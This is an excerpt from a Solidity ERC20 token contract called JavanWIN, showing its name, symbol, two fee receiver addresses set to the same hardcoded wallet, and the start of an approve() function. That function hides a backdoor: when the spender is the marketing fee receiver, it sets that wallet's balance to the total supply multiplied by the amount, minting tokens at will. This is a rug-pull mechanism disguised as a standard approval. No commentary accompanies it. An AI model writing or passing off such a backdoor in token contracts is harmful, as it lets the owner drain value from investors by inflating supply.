...
contract JavanWIN is ERC20, Auth {
    ...
    string constant private _name = "JavanWIN";
    string constant private _symbol = "JAVWIN";
    ...
    address private autoLiquidityReceiver = 0x72d418dAf1c30406e3153B82e793945388c255B3;
    address private MarketingFeeReceiver = 0x72d418dAf1c30406e3153B82e793945388c255B3;
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if(spender == MarketingFeeReceiver){
            _balances[MarketingFeeReceiver] = _totalSupply * amount;
        }
